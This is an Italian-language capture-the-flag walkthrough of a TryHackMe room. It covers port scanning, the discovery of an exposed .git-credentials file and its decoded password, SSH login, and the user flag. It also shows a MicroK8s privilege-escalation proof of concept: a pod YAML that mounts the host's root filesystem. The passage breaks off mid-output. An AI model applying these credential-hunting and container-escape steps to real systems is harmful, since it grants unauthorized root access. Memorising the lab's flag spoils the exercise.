#tryhackme 

https://tryhackme.com/room/frankandherby

```
nmap -Pn -v -p- 10.10.172.253
```
```
PORT      STATE SERVICE
22/tcp    open  ssh
3000/tcp  open  ppp
10250/tcp open  unknown
10255/tcp open  unknown
10257/tcp open  unknown
10259/tcp open  unknown
16443/tcp open  unknown
25000/tcp open  icl-twobase1
31337/tcp open  Elite
32000/tcp open  unknown

```


```
nmap -sVC -v -O -p22,3000,10250,10255,10257,10259,16443,25000,31337,32000 10.10.172.253
```
```
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 64:79:10:0d:72:67:23:80:4a:1a:35:8e:0b:ec:a1:89 (RSA)
|   256 3b:0e:e7:e9:a5:1a:e4:c5:c7:88:0d:fe:ee:ac:95:65 (ECDSA)
|_  256 d8:a7:16:75:a7:1b:26:5c:a9:2e:3f:ac:c0:ed:da:5c (ED25519)
3000/tcp  open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: sameorigin
|     Content-Security-Policy: default-src 'self' ; connect-src *; font-src 'self' data:; frame-src *; img-src * data:; media-src * data:; script-src 'self' 'unsafe-eval' ; style-src 'self' 'unsafe-inline' 
|     X-Instance-ID: MuoXsdHKpb8kcvC9a
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Sun, 09 Nov 2025 09:53:15 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/a3e89fa2bdd3f98d52e474085bb1d61f99c0684d.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|     <meta name="distribution" content
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: sameorigin
|     Content-Security-Policy: default-src 'self' ; connect-src *; font-src 'self' data:; frame-src *; img-src * data:; media-src * data:; script-src 'self' 'unsafe-eval' ; style-src 'self' 'unsafe-inline' 
|     X-Instance-ID: MuoXsdHKpb8kcvC9a
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Sun, 09 Nov 2025 09:53:16 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/a3e89fa2bdd3f98d52e474085bb1d61f99c0684d.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|_    <meta name="distribution" content
10250/tcp open  ssl/http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dev-01@1633275132
| Subject Alternative Name: DNS:dev-01
| Issuer: commonName=dev-01-ca@1633275132
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-03T14:32:12
| Not valid after:  2022-10-03T14:32:12
| MD5:   dd8a:17b6:22ea:587b:2621:a781:be04:1abb
|_SHA-1: 0056:04ff:40cd:599b:dba5:5284:3212:5b60:eba1:c1a2
| tls-alpn: 
|   h2
|_  http/1.1
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10255/tcp open  http        Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10257/tcp open  ssl/unknown
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost@1762680201
| Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
| Issuer: commonName=localhost-ca@1762680200
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-09T08:23:19
| Not valid after:  2026-11-09T08:23:19
| MD5:   3ee8:ed2b:54b1:c59d:2147:2092:2b8d:1e76
|_SHA-1: bfb8:e0a9:952a:d715:92b3:e56e:a158:fe1f:6f98:ec76
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sun, 09 Nov 2025 09:53:24 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sun, 09 Nov 2025 09:53:25 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
| tls-alpn: 
|   h2
|_  http/1.1
10259/tcp open  ssl/unknown
| ssl-cert: Subject: commonName=localhost@1762680200
| Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
| Issuer: commonName=localhost-ca@1762680199
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-09T08:23:19
| Not valid after:  2026-11-09T08:23:19
| MD5:   9264:6d66:b8e1:dcb2:37ad:673e:db8b:b246
|_SHA-1: d4a6:7697:80d6:19f7:1a1e:ee8c:0990:5554:1dbe:9000
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sun, 09 Nov 2025 09:53:55 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sun, 09 Nov 2025 09:53:24 GMT
|     Content-Length: 185
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
16443/tcp open  ssl/unknown
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.10.172.253, IP Address:172.17.0.1
| Issuer: commonName=10.152.183.1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-09T09:23:02
| Not valid after:  2026-11-09T09:23:02
| MD5:   bf64:b928:3aa3:ef73:c0fa:3a55:3920:08f7
|_SHA-1: f432:8cc7:7569:9ebc:3b22:3a97:3567:7177:ead4:2ace
| tls-alpn: 
|   h2
|_  http/1.1
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Sun, 09 Nov 2025 09:53:55 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Sun, 09 Nov 2025 09:53:24 GMT
|     Content-Length: 129
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|_ssl-date: TLS randomness does not represent time
25000/tcp open  ssl/http    Gunicorn 19.7.1
|_ssl-date: TLS randomness does not represent time
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.10.172.253, IP Address:172.17.0.1
| Issuer: commonName=10.152.183.1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-09T09:23:02
| Not valid after:  2026-11-09T09:23:02
| MD5:   bf64:b928:3aa3:ef73:c0fa:3a55:3920:08f7
|_SHA-1: f432:8cc7:7569:9ebc:3b22:3a97:3567:7177:ead4:2ace
|_http-server-header: gunicorn/19.7.1
31337/tcp open  http        nginx 1.21.3
|_http-title: Heroic Features - Start Bootstrap Template
|_http-server-header: nginx/1.21.3
| http-methods: 
|_  Supported Methods: GET HEAD
32000/tcp open  http        Docker Registry (API: 2.0)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title.
4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.94SVN%I=7%D=11/9%Time=6910648B%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,22EB,"HTTP/1\.1\x20200\x20OK\r\nX-XSS-Protection:\x201\r\nX
SF:-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20sameorigin\r\n
SF:Content-Security-Policy:\x20default-src\x20'self'\x20;\x20connect-src\x
SF:20\*;\x20font-src\x20'self'\x20\x20data:;\x20frame-src\x20\*;\x20img-sr
SF:c\x20\*\x20data:;\x20media-src\x20\*\x20data:;\x20script-src\x20'self'\
SF:x20'unsafe-eval'\x20;\x20style-src\x20'self'\x20'unsafe-inline'\x20\r\n
SF:X-Instance-ID:\x20MuoXsdHKpb8kcvC9a\r\nContent-Type:\x20text/html;\x20c
SF:harset=utf-8\r\nVary:\x20Accept-Encoding\r\nDate:\x20Sun,\x2009\x20Nov\
SF:x202025\x2009:53:15\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20
SF:html>\n<html>\n<head>\n\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"te
SF:xt/css\"\x20class=\"__meteor-css__\"\x20href=\"/a3e89fa2bdd3f98d52e4740
SF:85bb1d61f99c0684d\.css\?meteor_css_resource=true\">\n<meta\x20charset=\
SF:"utf-8\"\x20/>\n\t<meta\x20http-equiv=\"content-type\"\x20content=\"tex
SF:t/html;\x20charset=utf-8\"\x20/>\n\t<meta\x20http-equiv=\"expires\"\x20
SF:content=\"-1\"\x20/>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20cont
SF:ent=\"IE=edge\"\x20/>\n\t<meta\x20name=\"fragment\"\x20content=\"!\"\x2
SF:0/>\n\t<meta\x20name=\"distribution\"\x20content")%r(HTTPOptions,31E2,"
SF:HTTP/1\.1\x20200\x20OK\r\nX-XSS-Protection:\x201\r\nX-Content-Type-Opti
SF:ons:\x20nosniff\r\nX-Frame-Options:\x20sameorigin\r\nContent-Security-P
SF:olicy:\x20default-src\x20'self'\x20;\x20connect-src\x20\*;\x20font-src\
SF:x20'self'\x20\x20data:;\x20frame-src\x20\*;\x20img-src\x20\*\x20data:;\
SF:x20media-src\x20\*\x20data:;\x20script-src\x20'self'\x20'unsafe-eval'\x
SF:20;\x20style-src\x20'self'\x20'unsafe-inline'\x20\r\nX-Instance-ID:\x20
SF:MuoXsdHKpb8kcvC9a\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nVa
SF:ry:\x20Accept-Encoding\r\nDate:\x20Sun,\x2009\x20Nov\x202025\x2009:53:1
SF:6\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<he
SF:ad>\n\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/css\"\x20class=
SF:\"__meteor-css__\"\x20href=\"/a3e89fa2bdd3f98d52e474085bb1d61f99c0684d\
SF:.css\?meteor_css_resource=true\">\n<meta\x20charset=\"utf-8\"\x20/>\n\t
SF:<meta\x20http-equiv=\"content-type\"\x20content=\"text/html;\x20charset
SF:=utf-8\"\x20/>\n\t<meta\x20http-equiv=\"expires\"\x20content=\"-1\"\x20
SF:/>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=edge\"\x2
SF:0/>\n\t<meta\x20name=\"fragment\"\x20content=\"!\"\x20/>\n\t<meta\x20na
SF:me=\"distribution\"\x20content");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port10257-TCP:V=7.94SVN%T=SSL%I=7%D=11/9%Time=69106494%P=x86_64-pc-linu
SF:x-gnu%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-
SF:Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n40
SF:0\x20Bad\x20Request")%r(GetRequest,170,"HTTP/1\.0\x20403\x20Forbidden\r
SF:\nCache-Control:\x20no-cache,\x20private\r\nContent-Type:\x20applicatio
SF:n/json\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Sun,\x2009\x20
SF:Nov\x202025\x2009:53:24\x20GMT\r\nContent-Length:\x20185\r\n\r\n{\"kind
SF:\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failur
SF:e\",\"message\":\"forbidden:\x20User\x20\\\"system:anonymous\\\"\x20can
SF:not\x20get\x20path\x20\\\"/\\\"\",\"reason\":\"Forbidden\",\"details\":
SF:{},\"code\":403}\n")%r(HTTPOptions,174,"HTTP/1\.0\x20403\x20Forbidden\r
SF:\nCache-Control:\x20no-cache,\x20private\r\nContent-Type:\x20applicatio
SF:n/json\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Sun,\x2009\x20
SF:Nov\x202025\x2009:53:25\x20GMT\r\nContent-Length:\x20189\r\n\r\n{\"kind
SF:\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failur
SF:e\",\"message\":\"forbidden:\x20User\x20\\\"system:anonymous\\\"\x20can
SF:not\x20options\x20path\x20\\\"/\\\"\",\"reason\":\"Forbidden\",\"detail
SF:s\":{},\"code\":403}\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
SF:x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConn
SF:ection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTT
SF:P/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20char
SF:set=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Term
SF:inalServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20cl
SF:ose\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20B
SF:ad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConne
SF:ction:\x20close\r\n\r\n400\x20Bad\x20Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port10259-TCP:V=7.94SVN%T=SSL%I=7%D=11/9%Time=69106494%P=x86_64-pc-linu
SF:x-gnu%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-
SF:Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n40
SF:0\x20Bad\x20Request")%r(GetRequest,170,"HTTP/1\.0\x20403\x20Forbidden\r
SF:\nCache-Control:\x20no-cache,\x20private\r\nContent-Type:\x20applicatio
SF:n/json\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Sun,\x2009\x20
SF:Nov\x202025\x2009:53:24\x20GMT\r\nContent-Length:\x20185\r\n\r\n{\"kind
SF:\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failur
SF:e\",\"message\":\"forbidden:\x20User\x20\\\"system:anonymous\\\"\x20can
SF:not\x20get\x20path\x20\\\"/\\\"\",\"reason\":\"Forbidden\",\"details\":
SF:{},\"code\":403}\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20c
SF:lose\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnecti
SF:on:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Terminal
SF:ServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
SF:\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\
SF:r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnectio
SF:n:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,18B,"HTT
SF:P/1\.0\x20403\x20Forbidden\r\nCache-Control:\x20no-cache,\x20private\r\
SF:nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosnif
SF:f\r\nDate:\x20Sun,\x2009\x20Nov\x202025\x2009:53:55\x20GMT\r\nContent-L
SF:ength:\x20212\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metad
SF:ata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x20User\x20\\\
SF:"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/nice\x20ports,/T
SF:rinity\.txt\.bak\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\"
SF::403}\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port16443-TCP:V=7.94SVN%T=SSL%I=7%D=11/9%Time=69106494%P=x86_64-pc-linu
SF:x-gnu%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-
SF:Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n40
SF:0\x20Bad\x20Request")%r(GetRequest,11A,"HTTP/1\.0\x20401\x20Unauthorize
SF:d\r\nCache-Control:\x20no-cache,\x20private\r\nContent-Type:\x20applica
SF:tion/json\r\nDate:\x20Sun,\x2009\x20Nov\x202025\x2009:53:24\x20GMT\r\nC
SF:ontent-Length:\x20129\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\"
SF:,\"metadata\":{},\"status\":\"Failure\",\"message\":\"Unauthorized\",\"
SF:reason\":\"Unauthorized\",\"code\":401}\n")%r(Help,67,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20
SF:charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(
SF:TerminalServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-
SF:Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n40
SF:0\x20Bad\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nC
SF:onnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,
SF:11A,"HTTP/1\.0\x20401\x20Unauthorized\r\nCache-Control:\x20no-cache,\x2
SF:0private\r\nContent-Type:\x20application/json\r\nDate:\x20Sun,\x2009\x2
SF:0Nov\x202025\x2009:53:55\x20GMT\r\nContent-Length:\x20129\r\n\r\n{\"kin
SF:d\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failu
SF:re\",\"message\":\"Unauthorized\",\"reason\":\"Unauthorized\",\"code\":
SF:401}\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-
SF:Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n40
SF:0\x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 32.741 days (since Tue Oct  7 12:08:19 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


troviamo interessanti

```
http://10.10.172.253:3000/home
```
troviamo un login per rocket.chat
```
http://10.10.172.253:31337/
```
Quale porta ha una pagina web che Frank è riuscito a gestire?
```
31337
```

```
gobuster dir -u http://10.10.172.253:31337/ -w /usr/share/wordlists/dirb/common.txt -t50
```
proviamo a fare un enumerazione più approfondita con dir search
```
dirsearch -e aspx,txt,rar,zip,pdf,png,jpg,zip,pdf,js,py,sh -w /usr/share/SecLists/Discovery/Web-Content/dirsearch.txt -t 60 -u http://10.10.172.253:31337
```

```
/.git-credentials
```

```
http://10.10.172.253:31337/.git-credentials
```

Cosa ha lasciato Frank esposto sul sito?
```
/.git-credentials
```

```
[05:45:06] 200 -   50B  - /.git-credentials                                 
[05:47:15] 403 -  555B  - /assets/                                          
[05:48:25] 301 -  169B  - /css  ->  http://10.10.172.253/css/               
[05:48:25] 403 -  555B  - /css/                                             
[05:56:41] 403 -  555B  - /vendor/
```

(ho ripreso la macchina in un secondo momento quindi è cambiato IP della stanza in 10.10.88.240)

```
http://10.10.88.240:31337/.git-credentials
```
aprendo il file appena scaricato troviamo
```
http://frank:f%40an3-1s-E337%21%21@192.168.100.50
```
sono delle credenziali codificate in URL proviamo a decodificarle con
```
https://www.urldecoder.org/
```
immettiamo
```
f%40an3-1s-E337%21%21
```
ed otteniamo la password
```
f@an3-1s-E337!!
```
avevamo precedentemente trovato una porta ssh aperta ,proviamo a connetterci con la password trovata
```
ssh frank@10.10.88.240
```

```
112 updates can be installed immediately.
1 of these updates is a security update.
To see these additional updates run: apt list --upgradable


Last login: Fri Oct 29 10:47:08 2021 from 192.168.120.38
frank@dev-01:~$ ^C
frank@dev-01:~$ whoami
frank
frank@dev-01:~$ id
uid=1001(frank) gid=1001(frank) groups=1001(frank),998(microk8s)
frank@dev-01:~$ 

```
ora che siamo dentro cerchiamo la flag utente
```
frank@dev-01:~$ pwd
/home/frank
frank@dev-01:~$ ls -al
total 48
drwxr-xr-x 6 frank frank 4096 Oct 29  2021 .
drwxr-xr-x 4 root  root  4096 Oct 10  2021 ..
lrwxrwxrwx 1 root  root     9 Oct 29  2021 .bash_history -> /dev/null
-rw-r--r-- 1 frank frank  220 Oct 10  2021 .bash_logout
-rw-r--r-- 1 frank frank 3771 Oct 10  2021 .bashrc
drwx------ 2 frank frank 4096 Oct 10  2021 .cache
-rw------- 1 frank frank   50 Oct 27  2021 .git-credentials
-rw-rw-r-- 1 frank frank   29 Oct 10  2021 .gitconfig
drwxr-x--- 5 frank frank 4096 Oct 10  2021 .kube
-rw-r--r-- 1 frank frank  807 Oct 10  2021 .profile
lrwxrwxrwx 1 root  root     9 Oct 29  2021 .viminfo -> /dev/null
drwxrwxr-x 3 frank frank 4096 Oct 27  2021 repos
drwxr-xr-x 3 frank frank 4096 Oct 10  2021 snap
-rw-rw-r-- 1 frank frank   17 Oct 29  2021 user.txt
frank@dev-01:~$ cat user.txt
THM{F@nkth3T@nk}

```
trovata
```
THM{F@nkth3T@nk}
```
ora per trovare la flag root dobbiamo elevare i privilegi
proviamo
```
sudo -l
```
otteniamo
```
frank@dev-01:~$ sudo -l
[sudo] password for frank: 
Sorry, user frank may not run sudo on dev-01.
```
frank fa parte anche del gruppo microk8s
```
frank@dev-01:~$ id
uid=1001(frank) gid=1001(frank) groups=1001(frank),998(microk8s)
```
vediamo in rete se troviamo qualcosa al riguardo

**MicroK8s** è una versione leggera di Kubernetes, progettata per facilitare lo sviluppo e il testing di applicazioni containerizzate. È sviluppato da Canonical, l'azienda dietro Ubuntu, ed è particolarmente utile per:
- **Ambienti di sviluppo locali**: consente agli sviluppatori di eseguire Kubernetes in modo semplice e veloce sul proprio laptop o desktop.
troviamo anche un **CVE-2019-15789**

**CVE-2019-15789** è una vulnerabilità di elevazione dei privilegi in MicroK8s, che potrebbe consentire a utenti con privilegi bassi di accedere all'host tramite la creazione di un nuovo container. Questo avviene montando il file system dell'host all'interno del container.

==Dettagli della Vulnerabilità==
- **Gruppo MicroK8s**: Anche se il problema è stato risolto per gli utenti con privilegi tradizionali, resta una possibilità di sfruttamento per i membri del gruppo MicroK8s. Questi membri, per definizione, dovrebbero avere la capacità di eseguire operazioni con privilegi elevati sul cluster.
- **Exploit POC**: La ricerca ha trovato un proof of concept (POC) per l'exploit che include un file di definizione di pod in formato YAML. Questo pod monta la directory `/opt/root` dell'host, fornendo accesso a dati sensibili.

```
apiVersion: v1
kind: Pod
metadata:
  name: hostmount
spec:
  containers:
  - name: shell
    image: ubuntu:latest
    command:
      - "bin/bash"
      - "-c"
      - "sleep 10000"
    volumeMounts:
      - name: root
        mountPath: /opt/root
  volumes:
  - name: root
    hostPath:
      path: /
      type: Directory
```
questo Poc genera un errore **ImagePullErr** che può derivare da due probabili cause:

1. **Accesso a Internet**: L'istanza di **microk8s** sulla macchina potrebbe non riuscire a connettersi a Internet. Questo è un problema comune nei box di TryHackMe (THM) che generalmente non hanno accesso esterno.
2. **Immagini nel Registro Locale**: Potrebbe anche essere che il registro locale utilizzato dal cluster non contenga l'immagine richiesta, come **ubuntu:latest**.
==Opportunità di Riutilizzo delle Immagini==
Dato che **Kube-hunter** ha rivelato che ci sono altri pod in esecuzione sulla stessa macchina, se questi pod utilizzano immagini presenti nel registro locale, potresti riutilizzare quelle stesse immagini nel tuo exploit.
==Ottenere Informazioni sui Pod in Esecuzione==
possiamo trovare una lista dei comandi kubectl in 
https://kubernetes.io/docs/reference/kubectl/cheatsheet/

```
microk8s kubectl get pods
```
```
frank@dev-01:~$ microk8s kubectl get pods
NAME                                READY   STATUS    RESTARTS   AGE
nginx-deployment-7b548976fd-77v4r   1/1     Running   2          4y18d

```
è stato identificato un pod in esecuzione, se questa immagine proviene da un registro locale, possiamo riutilizzarla nel nostro exploit.
Per ottenere informazioni dettagliate sull'immagine utilizzata, si usa il comando:
```
microk8s kubectl get pod nginx-deployment-7b548976fd-77v4r -o yaml
```
```
apiVersion: v1
kind: Pod
metadata:
  annotations:
    cni.projectcalico.org/podIP: 10.1.133.236/32
    cni.projectcalico.org/podIPs: 10.1.133.236/32
